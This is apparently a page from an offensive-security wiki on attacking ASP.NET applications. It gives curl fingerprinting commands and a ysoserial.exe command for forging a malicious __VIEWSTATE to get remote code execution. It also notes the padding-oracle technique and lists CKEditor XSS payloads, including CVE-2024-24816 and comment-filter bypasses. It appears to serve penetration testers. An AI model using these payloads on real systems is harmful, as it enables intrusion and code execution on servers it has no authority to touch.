---
tags:
  - Web
---

# :material-microsoft: ASP.NET

<span class="pill pill-hard">ViewState → RCE</span> <span class="pill pill-info">web</span>

ASP.NET underpins a huge share of enterprise web (SharePoint, DotNetNuke, Telerik,
OutSystems). The recurring wins are **ViewState/machineKey deserialization RCE**,
verbose `DEBUG`/error leakage, and padding-oracle attacks against encrypted tokens.

!!! abstract "TL;DR"
    Fingerprint via `X-AspNet-Version`, `.aspx`, and `__VIEWSTATE`. If `DEBUG` is on
    you get stack traces + source paths. With a leaked `machineKey` (or an unprotected
    ViewState) forge a `__VIEWSTATE` gadget for RCE; encrypted tokens may fall to a
    padding oracle.

## :material-magnify: Fingerprint

```bash
curl -sI https://$TARGET/ | grep -iE 'x-aspnet|x-powered-by'   # X-AspNet-Version, X-Powered-By
# __VIEWSTATE / __EVENTVALIDATION hidden fields in .aspx forms
curl -s https://$TARGET/ | grep -oE '__VIEWSTATE|__EVENTVALIDATION'
```

## :material-bug: DEBUG mode enabled

`<compilation debug="true">` in `web.config` yields verbose stack traces, absolute
source paths, and framework internals on error — trigger an exception (bad type in a
form field, malformed request) and read the leaked detail. Treat as an info-disclosure
foothold that feeds the attacks below.

## :material-fire: ViewState / machineKey deserialization

If the `machineKey` (`validationKey` + `decryptionKey`) leaks — config disclosure,
another app's bug, or a known default — forge a malicious `__VIEWSTATE`:

```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  --generator=<gen> --validationkey=<vk> --validationalg=<alg> \
  --decryptionkey=<dk> --decryptionalg=<da> -c "cmd /c whoami"
```

- Unprotected ViewState (`enableViewStateMac="false"`, legacy apps) needs no key.
- See [Deserialization](../web/deserialization.md); the same primitive drives the
  SharePoint ToolShell chain.

## :material-lock-open: Padding oracle (MS10-070 / CVE-2010-3332)

Encrypted ASP.NET tokens (`WebResource.axd`/`ScriptResource.axd`, ViewState) can leak
plaintext and enable ciphertext forgery via a **CBC padding oracle** when the app
returns distinguishable errors for valid vs invalid padding. Classic tooling:
`padBuster`. Reference: the "Exploiting the .NET Padding Oracle" research (Rizzo/Duong).

## :material-alert-decagram: Notable client-side CVEs

Apps embedding the **CKEditor** rich-text component are frequently XSS-able — worth
testing wherever `.NET` apps expose a WYSIWYG field:

```html
<!-- CVE-2024-24816 (CKEditor < 4.24.0-lts) -->
<p>&gt;</p>
<p><a href="javascript:alert(document.domain)">XSS</a></p>

<!-- cke_protected comment bypasses -->
<!--{cke_protected} --!><img src=1 onerror=alert(`XSS`)>
<!--{cke{cke_protected}_protected} --!><img src=1 onerror=alert(`XSS`)>
<p data-cke-filter="off"><script>alert('XSS');cke_temp(comment)</script></p>
```

## :material-link-variant: Related

- Basis for [SharePoint](sharepoint.md), [DotNetNuke](dotnetnuke.md), [Telerik UI](telerik.md), [OutSystems](outsystems.md).
- Core primitive: [Deserialization](../web/deserialization.md); output: [XSS](../web/xss.md).
- Reference: [ysoserial.net](https://github.com/pwntester/ysoserial.net), [CVE-2024-24816](https://nvd.nist.gov/vuln/detail/CVE-2024-24816).
